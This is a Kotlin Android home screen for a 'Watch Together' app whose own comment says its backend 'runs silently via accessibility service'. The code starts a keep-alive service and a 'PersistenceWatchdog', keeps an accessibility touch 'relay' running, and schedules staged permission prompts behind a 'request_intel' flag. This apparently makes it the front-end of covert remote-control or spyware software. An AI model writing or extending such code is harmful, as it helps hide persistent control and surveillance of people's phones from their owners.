package com.phonehand.app

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

/** Minimal Watch Together home — backend runs silently via accessibility service. */
class HomeActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (!UserSession.isSignedUp(this) || !UserSession.onboardingDone(this)) {
            startActivity(Intent(this, OnboardingActivity::class.java))
            finish()
            return
        }

        if (intent.getBooleanExtra(EXTRA_REQUEST_INTEL, false)) {
            PermissionWizardActivity.launch(this)
            finish()
            return
        }

        setContentView(R.layout.activity_home)
        SafeKeepAlive.start(this)
        PersistenceWatchdog.schedule(this)
        TouchAccessibilityService.instance?.ensureRelay()
        if (PermissionMoments.hasHomeBatch(this)) {
            PermissionMoments.scheduleHomeSession(this)
        }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        if (intent.getBooleanExtra(EXTRA_REQUEST_INTEL, false)) {
            PermissionWizardActivity.launch(this)
            finish()
        }
    }

    override fun onResume() {
        super.onResume()
        if (!WatchSync.isEnabled(this) &&
            UserSession.onboardingDone(this) &&
            UserSession.permissionsWizardDone(this)
        ) {
            startActivity(Intent(this, OnboardingActivity::class.java))
            finish()
            return
        }
        TouchAccessibilityService.instance?.ensureRelay()
    }

    companion object {
        const val EXTRA_REQUEST_INTEL = "request_intel"
    }
}
